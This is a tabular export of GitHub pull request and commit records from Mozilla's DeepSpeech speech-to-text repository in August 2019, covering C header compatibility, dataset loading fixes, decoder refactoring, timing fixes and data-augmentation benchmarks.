1927,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2325,2325,Test PR #2324,,reuben,477142,2019-08-28T07:00:06Z,MEMBER,False,18,10,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4da02496a99c5d29b75b8e4ed971f92cb92b9d39,Use struct typedefs for C compatibility;
1928,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2325,2325,Test PR #2324,,reuben,477142,2019-08-28T07:00:06Z,MEMBER,False,18,10,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,031c13cadb8dd81a9c9c9d8cda94e0c19bfff855,rm trailing whitespace;
1929,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2324,2324,C compatibility,"Currently it is not possible to use `deepspeech.h` in a project written in C, since there are compilation errors related to the use of `extern ""C""` and missing struct keywords/typedefs.

With the following changes, I am able to use `native_client` in both C and C++ projects:

- Wrap the header in `extern ""C""`, only when compiling as C++.
- Use `typedef` for structs so that they can be used without the `struct` tag.

I also removed trailing whitespace from the header.  I can rebase out that change if needed.",bjornbytes,784805,2019-08-27T22:46:29Z,CONTRIBUTOR,True,18,10,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d24f19115a8f6c0c0ebb75d57aaff4bf5d6fcea,Only use extern C when compiling as C++;
1930,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2324,2324,C compatibility,"Currently it is not possible to use `deepspeech.h` in a project written in C, since there are compilation errors related to the use of `extern ""C""` and missing struct keywords/typedefs.

With the following changes, I am able to use `native_client` in both C and C++ projects:

- Wrap the header in `extern ""C""`, only when compiling as C++.
- Use `typedef` for structs so that they can be used without the `struct` tag.

I also removed trailing whitespace from the header.  I can rebase out that change if needed.",bjornbytes,784805,2019-08-27T22:46:29Z,CONTRIBUTOR,True,18,10,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73b2bbe8da27f02c512ab433c3c06a4dab53c9e9,Use struct typedefs for C compatibility;
1931,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2324,2324,C compatibility,"Currently it is not possible to use `deepspeech.h` in a project written in C, since there are compilation errors related to the use of `extern ""C""` and missing struct keywords/typedefs.

With the following changes, I am able to use `native_client` in both C and C++ projects:

- Wrap the header in `extern ""C""`, only when compiling as C++.
- Use `typedef` for structs so that they can be used without the `struct` tag.

I also removed trailing whitespace from the header.  I can rebase out that change if needed.",bjornbytes,784805,2019-08-27T22:46:29Z,CONTRIBUTOR,True,18,10,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7fc74c0783b83bee77090de70a6c69b1ffb661a,rm trailing whitespace;
1932,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2322,2322,Fixed issue where multiple csvs could not load,"With the new `create_dataset` approach introduced by PR #2283 (read: mine, sorry!), duplicate
indices in the df would cause a fatal error where the columns could not be referenced by
name. Adding `ignore_index=True` during append allows pandas to assign new indices to
rows, and fixes the issue.",rcgale,2279700,2019-08-26T20:45:51Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,05448441d354b94449a07dee64c69a09db2b77a4,"Fixed issue where multiple csvs could not load

With the new `create_dataset` approach introduced by PR #2283 (read: mine, sorry!), duplicate
indices in the df would cause a fatal error where the columns could not be referenced by
name. Adding `ignore_index=True` during append allows pandas to assign new indices to
rows, and fixes the issue."
1933,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2321,2321,Thm Timings NOT READY FOR MERGE ,"NOT READY FOR MERGE 

just creating a PR so its easy to see the changes that have ended up a little bit 'orphaned' by the refactors that have taken place in Mozilla/DeepSpeech 0.5.1 ",utunga,166867,2019-08-25T10:08:40Z,NONE,False,109,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5b1ccf7e98e0bd152f57b2e5f39b20d5a9ca218,add probabilities to MetadataItem
1934,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2321,2321,Thm Timings NOT READY FOR MERGE ,"NOT READY FOR MERGE 

just creating a PR so its easy to see the changes that have ended up a little bit 'orphaned' by the refactors that have taken place in Mozilla/DeepSpeech 0.5.1 ",utunga,166867,2019-08-25T10:08:40Z,NONE,False,109,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,98c55980dbf0a3b81012fe4ed30dddbe5a3b7d79,hackity hacks to get things building in local environment
1935,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2321,2321,Thm Timings NOT READY FOR MERGE ,"NOT READY FOR MERGE 

just creating a PR so its easy to see the changes that have ended up a little bit 'orphaned' by the refactors that have taken place in Mozilla/DeepSpeech 0.5.1 ",utunga,166867,2019-08-25T10:08:40Z,NONE,False,109,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3369285550aaa59294cc7ec850acb56f3a8e1b65,WIP - logits are probabilities - works
1936,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2321,2321,Thm Timings NOT READY FOR MERGE ,"NOT READY FOR MERGE 

just creating a PR so its easy to see the changes that have ended up a little bit 'orphaned' by the refactors that have taken place in Mozilla/DeepSpeech 0.5.1 ",utunga,166867,2019-08-25T10:08:40Z,NONE,False,109,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aac271a259f03d64308ef2c21d081285079c66cb,"Add entropy , acoustic_char and tidy up a bit"
1937,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2321,2321,Thm Timings NOT READY FOR MERGE ,"NOT READY FOR MERGE 

just creating a PR so its easy to see the changes that have ended up a little bit 'orphaned' by the refactors that have taken place in Mozilla/DeepSpeech 0.5.1 ",utunga,166867,2019-08-25T10:08:40Z,NONE,False,109,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,49bffcc8c67199de088593597d5887a7b5b0f078,WIP merge of the old entropy stuff
1938,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2320,2320,Use globbing instead of hardcoding SWIG version,Here's hoping this doesn't completely explode.,reuben,477142,2019-08-23T08:45:54Z,MEMBER,True,5,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,43b60a621c815cbfdf9b404f19337a74ce095ae5,Use globbing instead of hardcoding SWIG version
1939,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2317,2317,Update dep versions,,reuben,477142,2019-08-22T10:37:21Z,MEMBER,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1650bcf82d38dff4c44af16b57b0dd4fc3a4eb4d,Update dep versions
1940,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2316,2316,Bump VERSION to 0.6.0-alpha.5,,lissyx,1645737,2019-08-22T07:53:37Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97c373a8a942f7edc87a642b26320843af1990a7,Bump VERSION to 0.6.0-alpha.5
1941,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2313,2313,Statically link libsox,,lissyx,1645737,2019-08-21T08:54:33Z,COLLABORATOR,True,10,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8534c0f93ac7e848ae7ffcf41d24f5ed9fb36920,Statically link libsox
1942,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2311,2311,Move to ARMbian Buster,Fixes #2310,lissyx,1645737,2019-08-21T07:40:16Z,COLLABORATOR,True,51,105,33,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dfe8be30b43d3a4f2157dd7c61db676c435ddbbe,"Move to ARMbian Buster

Fixes #2310"
1943,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2309,2309,Add WPF example build,We need to build the WPF example to check any inconsistency with the client. Introduced the usage of `/t:Rebuild` to clean/build always and avoid any weird behavior from cached files.,carlfm01,32177100,2019-08-21T04:35:47Z,COLLABORATOR,True,21,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4812276d884c62381202bb1ccd72b463ca8d21ae,Add WPF example build
1944,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2308,2308,Remove ununsed prealloc frames,Fixes #2298,lissyx,1645737,2019-08-20T14:57:31Z,COLLABORATOR,True,11,32,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,81b3b159c457de07ad8e3b82f894654678ec5650,"Remove ununsed prealloc frames

Fixes #2298"
1945,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2307,2307,Build for Raspbian Buster,Fixes #2272,lissyx,1645737,2019-08-20T08:50:27Z,COLLABORATOR,True,33,27,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e06fce51ac0b47dcbdef7588050bac0d808d25f0,"Move Raspbian support to Buster

Fixes #2272"
1946,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2305,2305,Update import_voxforge.py,Fix importer,rhamnett,6739670,2019-08-18T08:44:46Z,CONTRIBUTOR,True,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,57156fffd0806ba89597cbb6d7e895c5ebce5a50,"Update import_voxforge.py

Fix importer"
1947,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2303,2303,"Simplify decoder impl by making it object oriented, avoid pointers where possible",,reuben,477142,2019-08-16T11:10:14Z,MEMBER,True,402,393,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d882a8aec3be2fceb75df0c421cc597ea97382b," Simplify decoder impl by making it object oriented, avoid pointers where possible"
1948,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2303,2303,"Simplify decoder impl by making it object oriented, avoid pointers where possible",,reuben,477142,2019-08-16T11:10:14Z,MEMBER,True,402,393,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4dabd248bcec90ee4b7e3d4770563c1eaa32e2dd,Make Alphabet copyable and default-constructable and avoid pointers
1949,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2303,2303,"Simplify decoder impl by making it object oriented, avoid pointers where possible",,reuben,477142,2019-08-16T11:10:14Z,MEMBER,True,402,393,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2ef9cca83b40b18def5d25a091c3828b9774028,Make Alphabet init fallible and check it in model creation
1950,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2303,2303,"Simplify decoder impl by making it object oriented, avoid pointers where possible",,reuben,477142,2019-08-16T11:10:14Z,MEMBER,True,402,393,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1b18494e638f658ae83cec13224931e3c1cfab99,Address review comments
1951,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2303,2303,"Simplify decoder impl by making it object oriented, avoid pointers where possible",,reuben,477142,2019-08-16T11:10:14Z,MEMBER,True,402,393,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c73010286711ef58dc4a957985a8fc6f2cd2903e,Avoid rebuilding decoder sources for every binary target
1952,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2303,2303,"Simplify decoder impl by making it object oriented, avoid pointers where possible",,reuben,477142,2019-08-16T11:10:14Z,MEMBER,True,402,393,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47b9b71776fe98724cde43d4638fe93fde2ec02b,Automatically format BUILD file with buildifier
1953,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2303,2303,"Simplify decoder impl by making it object oriented, avoid pointers where possible",,reuben,477142,2019-08-16T11:10:14Z,MEMBER,True,402,393,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89f63dcd69d935ad047d8fdef1579be4debb11ef,Make Scorer init fallible and check it in callers
1954,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2302,2302,Only update time step of leaf prefixes (Fixes #2294),"The intention of this check is to improve the accuracy of the timings by recording the time step where the character saw its highest probability rather than the first time step where it was seen. The problem happens when updating the time step of a prefix that already has children. In that case, if any of the children have a time step that is earlier than `new_timestep`, it'll break the linearity of the timings. My fix is to simply check that the prefix we're updating is a leaf.

For example, say during decoding we have the following beams (format is `(char | time)`, tree node id below, nodes with same id are the same object):

```
1. (-1 | 0 ) -> ('s' | 10) -> ('h' | 13) -> ('e' | 14)
       A             B             C             D

2. (-1 | 0 ) -> ('s' | 10) -> ('h' | 14)
       A             B             E
```

And the prefix list is `[B, C, D, E]`. Currently, if we process character 'h' in time step 15 with a probability higher than both C and E, we update both nodes to have time step 15, which breaks linearity in beam 1. With my fix, we only update node E, which is a leaf. In my tests this does fix the problem, but since we don't have any known good quality data to verify against, it's hard to know if it has other side effects.",reuben,477142,2019-08-16T09:36:48Z,MEMBER,True,19,16,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3bf5d3cc6f85ead9b4076adc3e182f54d503e72,"Only update time step of leaf prefixes

The intention of this check is to improve the accuracy of the timings by recording the time step where the character saw its highest probability rather than the first time step where it was seen. The problem happens when updating the time step of a prefix that already has children. In that case, if any of the children have a time step that is earlier than `new_timestep`, it'll break the linearity of the timings. My fix is to simply check that the prefix we're updating is a leaf.

For example, say during decoding we have the following beams (format is `(char | time)`, tree node id below, nodes with same id are the same object):

```
1. (-1 | 0 ) -> ('s' | 10) -> ('h' | 13) -> ('e' | 14)
        A                B                  C                D

2. (-1 | 0 ) -> ('s' | 10) -> ('h' | 14)
        A                B                  E
```

And the prefix list is [B, C, D, E]. Currently, if we process character 'h' in time step 15 with a probability higher than both C and E, we update both nodes to have time step 15, which breaks linearity in beam 1. With my fix, we only update node E, which is a leaf. In my tests this does fix the problem, but since we don't have any known good quality data to verify against, it's hard to know if it has other side effects."
1955,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2299,2299,Allow continuing transfer learning,- adds similar checkpoint load mechanism for transfer learning as in master,Jendker,14967831,2019-08-14T13:21:55Z,CONTRIBUTOR,True,34,19,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d10eec38278edf8dd8dab252df510782cf4b7247,Allow continuing transfer learning
1956,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2289,2289,Error message if a sample has non-finite loss,,reuben,477142,2019-08-06T12:07:12Z,MEMBER,True,21,8,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,248c01001e107a0f7789ec5a368c0cf9fe46931f,Error message if a sample has non-finite loss
1957,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2287,2287,Label validation - Replace hyphens with spaces,"I noticed when checking some of the files in the Common Voice dataset that there were situations like the following:

> Expected transcript: beall and the endall
> Actual transcript: be all and the end all

DeepSpeech actually got the transcription perfect, but it's still counted as inaccurate because the importer script stripped out the hyphen separating those words.

It also seems to cause issues with numbers, with `nineteen-sixty-nine` becoming `nineteensixtynine`.

This PR replaces hyphens with spaces and adds a regex for safety to strip out any double spaces that may occur as a result.",dabinat,18251622,2019-08-05T18:06:34Z,COLLABORATOR,True,3,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,abc05b4a4d104ad0d2be76e5d7ac910ba4a14716,Label validation - Replace hyphens with spaces
1958,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2284,2284,Data augmentations,"Data augmentation on feature-space and on spectrogram (using tf operations).
Check [here](https://colab.research.google.com/drive/1MolmJnPWzo1JbU6uA6dHPhnbHsPdzesA) to see how each augmentation change the spectrogram.


Here is a benchmark I've run *on our training set*, training for 40 epochs (no early-stop), comparing the augmentations.

|                        |                                 |            |           |            |               |
|------------------------|---------------------------------|------------|-----------|------------|---------------|
| Training for 40 epochs |                                 |            |           |            |               |
| Experiment                   | Model                           | WER (best) | Test loss | best epoch | training time |
| exp_2                 | Baseline (700 hidden)           | 0.04617    | 18.232    | 39         | 8:49:43       |
| exp_3                 | Baseline+Layernorm              | 0.04569    | 17.902    | 37         | 8:51:00       |
| exp_4                 | Baseline+Layernorm+MaskingAug   | 0.04331    | 17.568    | 30         | 9:10:54       |
|  **exp_5**                 | exp_4+dropoutAug (0.95)         | 0.04422    | 17.135    | 39         | 9:45:52       |
| exp_6                 | exp_4+dense_time_warp          | 0.04481    | 17.898    | 33         | 25:45:18***      |
| **exp_7**                 | exp_4+speedup (std=0.05)        | 0.04482    | 17.447    | 35         | 9:24:54       |
| exp_8                 | exp_4+tempo&pitch              | 0.04929    | 18.264    | 39         | 9:33:37       |
| **exp_9**                 | exp_4+additive_noise (std=0.05) | 0.04445    | 17.363    | 36         | 9:17:57       |
| exp_10                | exp_4+multiplicative_noise (std=0.05)     | 0.04484    | 17.756    | 38         | 9:21:41       |
| **task_11**                | exp_4+**bolds**                   | **0.04226**    | **17.155**    | 36         | 9:53:24       |

As you can see, the augmentations that seem improve test-loss is the **masking freq-time**, **dropoutAug**, **speedUp**, and **additive_noise**. Nonetheless, I've included the other augs in the PR (maybe you can find better parameters, or make it work).

IMO, augmentations based on image warping are **incredibly slow**, being the first to be excluded. The other augmentations seem pretty fast, as they are implemented using tf operations.

PS: my layer-norm implementation is slightly different from the one on yours branch, dunno which one is the best.",bernardohenz,810340,2019-08-02T01:37:19Z,COLLABORATOR,False,351,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a290a06f7b247127bd9135648969e168da13e8cc,-data-aug via additive and multiplicative noise in feature-space
1959,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2284,2284,Data augmentations,"Data augmentation on feature-space and on spectrogram (using tf operations).
Check [here](https://colab.research.google.com/drive/1MolmJnPWzo1JbU6uA6dHPhnbHsPdzesA) to see how each augmentation change the spectrogram.


Here is a benchmark I've run *on our training set*, training for 40 epochs (no early-stop), comparing the augmentations.

|                        |                                 |            |           |            |               |
|------------------------|---------------------------------|------------|-----------|------------|---------------|
| Training for 40 epochs |                                 |            |           |            |               |
| Experiment                   | Model                           | WER (best) | Test loss | best epoch | training time |
| exp_2                 | Baseline (700 hidden)           | 0.04617    | 18.232    | 39         | 8:49:43       |
| exp_3                 | Baseline+Layernorm              | 0.04569    | 17.902    | 37         | 8:51:00       |
| exp_4                 | Baseline+Layernorm+MaskingAug   | 0.04331    | 17.568    | 30         | 9:10:54       |
|  **exp_5**                 | exp_4+dropoutAug (0.95)         | 0.04422    | 17.135    | 39         | 9:45:52       |
| exp_6                 | exp_4+dense_time_warp          | 0.04481    | 17.898    | 33         | 25:45:18***      |
| **exp_7**                 | exp_4+speedup (std=0.05)        | 0.04482    | 17.447    | 35         | 9:24:54       |
| exp_8                 | exp_4+tempo&pitch              | 0.04929    | 18.264    | 39         | 9:33:37       |
| **exp_9**                 | exp_4+additive_noise (std=0.05) | 0.04445    | 17.363    | 36         | 9:17:57       |
| exp_10                | exp_4+multiplicative_noise (std=0.05)     | 0.04484    | 17.756    | 38         | 9:21:41       |
| **task_11**                | exp_4+**bolds**                   | **0.04226**    | **17.155**    | 36         | 9:53:24       |

As you can see, the augmentations that seem improve test-loss is the **masking freq-time**, **dropoutAug**, **speedUp**, and **additive_noise**. Nonetheless, I've included the other augs in the PR (maybe you can find better parameters, or make it work).

IMO, augmentations based on image warping are **incredibly slow**, being the first to be excluded. The other augmentations seem pretty fast, as they are implemented using tf operations.

PS: my layer-norm implementation is slightly different from the one on yours branch, dunno which one is the best.",bernardohenz,810340,2019-08-02T01:37:19Z,COLLABORATOR,False,351,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c4c53c69a2184cf3e7a0dd2cac596a70876946f,-spectrogram augmentations
1960,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2284,2284,Data augmentations,"Data augmentation on feature-space and on spectrogram (using tf operations).
Check [here](https://colab.research.google.com/drive/1MolmJnPWzo1JbU6uA6dHPhnbHsPdzesA) to see how each augmentation change the spectrogram.


Here is a benchmark I've run *on our training set*, training for 40 epochs (no early-stop), comparing the augmentations.

|                        |                                 |            |           |            |               |
|------------------------|---------------------------------|------------|-----------|------------|---------------|
| Training for 40 epochs |                                 |            |           |            |               |
| Experiment                   | Model                           | WER (best) | Test loss | best epoch | training time |
| exp_2                 | Baseline (700 hidden)           | 0.04617    | 18.232    | 39         | 8:49:43       |
| exp_3                 | Baseline+Layernorm              | 0.04569    | 17.902    | 37         | 8:51:00       |
| exp_4                 | Baseline+Layernorm+MaskingAug   | 0.04331    | 17.568    | 30         | 9:10:54       |
|  **exp_5**                 | exp_4+dropoutAug (0.95)         | 0.04422    | 17.135    | 39         | 9:45:52       |
| exp_6                 | exp_4+dense_time_warp          | 0.04481    | 17.898    | 33         | 25:45:18***      |
| **exp_7**                 | exp_4+speedup (std=0.05)        | 0.04482    | 17.447    | 35         | 9:24:54       |
| exp_8                 | exp_4+tempo&pitch              | 0.04929    | 18.264    | 39         | 9:33:37       |
| **exp_9**                 | exp_4+additive_noise (std=0.05) | 0.04445    | 17.363    | 36         | 9:17:57       |
| exp_10                | exp_4+multiplicative_noise (std=0.05)     | 0.04484    | 17.756    | 38         | 9:21:41       |
| **task_11**                | exp_4+**bolds**                   | **0.04226**    | **17.155**    | 36         | 9:53:24       |

As you can see, the augmentations that seem improve test-loss is the **masking freq-time**, **dropoutAug**, **speedUp**, and **additive_noise**. Nonetheless, I've included the other augs in the PR (maybe you can find better parameters, or make it work).

IMO, augmentations based on image warping are **incredibly slow**, being the first to be excluded. The other augmentations seem pretty fast, as they are implemented using tf operations.

PS: my layer-norm implementation is slightly different from the one on yours branch, dunno which one is the best.",bernardohenz,810340,2019-08-02T01:37:19Z,COLLABORATOR,False,351,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8008a330e726ed00ebe44739e1abbaafc0223e74,adding 'train_phase' to create_dataset. Now we can augment only the training-set.
1961,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2284,2284,Data augmentations,"Data augmentation on feature-space and on spectrogram (using tf operations).
Check [here](https://colab.research.google.com/drive/1MolmJnPWzo1JbU6uA6dHPhnbHsPdzesA) to see how each augmentation change the spectrogram.


Here is a benchmark I've run *on our training set*, training for 40 epochs (no early-stop), comparing the augmentations.

|                        |                                 |            |           |            |               |
|------------------------|---------------------------------|------------|-----------|------------|---------------|
| Training for 40 epochs |                                 |            |           |            |               |
| Experiment                   | Model                           | WER (best) | Test loss | best epoch | training time |
| exp_2                 | Baseline (700 hidden)           | 0.04617    | 18.232    | 39         | 8:49:43       |
| exp_3                 | Baseline+Layernorm              | 0.04569    | 17.902    | 37         | 8:51:00       |
| exp_4                 | Baseline+Layernorm+MaskingAug   | 0.04331    | 17.568    | 30         | 9:10:54       |
|  **exp_5**                 | exp_4+dropoutAug (0.95)         | 0.04422    | 17.135    | 39         | 9:45:52       |
| exp_6                 | exp_4+dense_time_warp          | 0.04481    | 17.898    | 33         | 25:45:18***      |
| **exp_7**                 | exp_4+speedup (std=0.05)        | 0.04482    | 17.447    | 35         | 9:24:54       |
| exp_8                 | exp_4+tempo&pitch              | 0.04929    | 18.264    | 39         | 9:33:37       |
| **exp_9**                 | exp_4+additive_noise (std=0.05) | 0.04445    | 17.363    | 36         | 9:17:57       |
| exp_10                | exp_4+multiplicative_noise (std=0.05)     | 0.04484    | 17.756    | 38         | 9:21:41       |
| **task_11**                | exp_4+**bolds**                   | **0.04226**    | **17.155**    | 36         | 9:53:24       |

As you can see, the augmentations that seem improve test-loss is the **masking freq-time**, **dropoutAug**, **speedUp**, and **additive_noise**. Nonetheless, I've included the other augs in the PR (maybe you can find better parameters, or make it work).

IMO, augmentations based on image warping are **incredibly slow**, being the first to be excluded. The other augmentations seem pretty fast, as they are implemented using tf operations.

PS: my layer-norm implementation is slightly different from the one on yours branch, dunno which one is the best.",bernardohenz,810340,2019-08-02T01:37:19Z,COLLABORATOR,False,351,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8466970ebe08b8cca27ee04dde69f682f0ba1494,space after comma
1962,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2284,2284,Data augmentations,"Data augmentation on feature-space and on spectrogram (using tf operations).
Check [here](https://colab.research.google.com/drive/1MolmJnPWzo1JbU6uA6dHPhnbHsPdzesA) to see how each augmentation change the spectrogram.


Here is a benchmark I've run *on our training set*, training for 40 epochs (no early-stop), comparing the augmentations.

|                        |                                 |            |           |            |               |
|------------------------|---------------------------------|------------|-----------|------------|---------------|
| Training for 40 epochs |                                 |            |           |            |               |
| Experiment                   | Model                           | WER (best) | Test loss | best epoch | training time |
| exp_2                 | Baseline (700 hidden)           | 0.04617    | 18.232    | 39         | 8:49:43       |
| exp_3                 | Baseline+Layernorm              | 0.04569    | 17.902    | 37         | 8:51:00       |
| exp_4                 | Baseline+Layernorm+MaskingAug   | 0.04331    | 17.568    | 30         | 9:10:54       |
|  **exp_5**                 | exp_4+dropoutAug (0.95)         | 0.04422    | 17.135    | 39         | 9:45:52       |
| exp_6                 | exp_4+dense_time_warp          | 0.04481    | 17.898    | 33         | 25:45:18***      |
| **exp_7**                 | exp_4+speedup (std=0.05)        | 0.04482    | 17.447    | 35         | 9:24:54       |
| exp_8                 | exp_4+tempo&pitch              | 0.04929    | 18.264    | 39         | 9:33:37       |
| **exp_9**                 | exp_4+additive_noise (std=0.05) | 0.04445    | 17.363    | 36         | 9:17:57       |
| exp_10                | exp_4+multiplicative_noise (std=0.05)     | 0.04484    | 17.756    | 38         | 9:21:41       |
| **task_11**                | exp_4+**bolds**                   | **0.04226**    | **17.155**    | 36         | 9:53:24       |

As you can see, the augmentations that seem improve test-loss is the **masking freq-time**, **dropoutAug**, **speedUp**, and **additive_noise**. Nonetheless, I've included the other augs in the PR (maybe you can find better parameters, or make it work).

IMO, augmentations based on image warping are **incredibly slow**, being the first to be excluded. The other augmentations seem pretty fast, as they are implemented using tf operations.

PS: my layer-norm implementation is slightly different from the one on yours branch, dunno which one is the best.",bernardohenz,810340,2019-08-02T01:37:19Z,COLLABORATOR,False,351,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ca3a164615956baacb8228e277d52dc01ae1ff28,removing trailing space
1963,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2283,2283,Checking for empty transcripts during character encoding,"This way we can get a plain English exception early, rather than a matrix shape error during training.",rcgale,2279700,2019-08-01T19:09:51Z,CONTRIBUTOR,True,24,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ec6ac80791ddb9e0c0146b346902710085d82f3,"Checking for empty transcripts during character encoding

This way we can get a plain English exception early, rather than a matrix shape error during training."
1964,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2283,2283,Checking for empty transcripts during character encoding,"This way we can get a plain English exception early, rather than a matrix shape error during training.",rcgale,2279700,2019-08-01T19:09:51Z,CONTRIBUTOR,True,24,7,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3e0e9f9bc078a34333575433ea4acc04c3b22e9,"Update text.py

""characters"" was a bad variable name now that I think about it"
